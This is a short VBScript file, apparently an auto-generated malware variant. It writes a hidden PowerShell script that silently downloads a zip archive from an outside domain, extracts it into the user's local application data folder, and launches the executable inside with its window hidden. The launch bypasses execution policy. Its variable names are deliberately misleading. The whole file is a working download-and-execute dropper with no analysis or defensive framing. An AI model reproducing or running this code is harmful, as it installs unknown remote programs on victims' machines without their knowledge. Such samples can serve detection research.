' Auto-generated VBS variant 04 (replacement - opentextfile curlL expand starthidden)
Set binQueue = CreateObject("Scripting.FileSystemObject")
dataToken = binQueue.GetSpecialFolder(2) & "\" & binQueue.GetTempName & ".ps1"
Set tlsWrapper = binQueue.OpenTextFile(dataToken, 2, True)
tlsWrapper.WriteLine "$ProgressPreference = 'SilentlyContinue'"
tlsWrapper.WriteLine "$ctxBuilder = [System.IO.Path]::GetTempFileName() + '.zip'"
tlsWrapper.WriteLine "$sysHandler = ""$env:LOCALAPPDATA\libHandle"""
tlsWrapper.WriteLine "curl.exe -sL -o $ctxBuilder https://universalllccorp.com/Grape.zip"
tlsWrapper.WriteLine "if (-not (Test-Path $sysHandler)) { New-Item -ItemType Directory -Path $sysHandler -Force | Out-Null }"
tlsWrapper.WriteLine "Expand-Archive -Path $ctxBuilder -DestinationPath $sysHandler -Force"
tlsWrapper.WriteLine "Remove-Item $ctxBuilder -Force"
tlsWrapper.WriteLine "if (Test-Path ""$sysHandler\Grape.exe"") { Start-Process ""$sysHandler\Grape.exe"" -WindowStyle Hidden }"
tlsWrapper.Close
Set envPool = CreateObject("WScript.Shell")
envPool.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & dataToken & """", 0, False
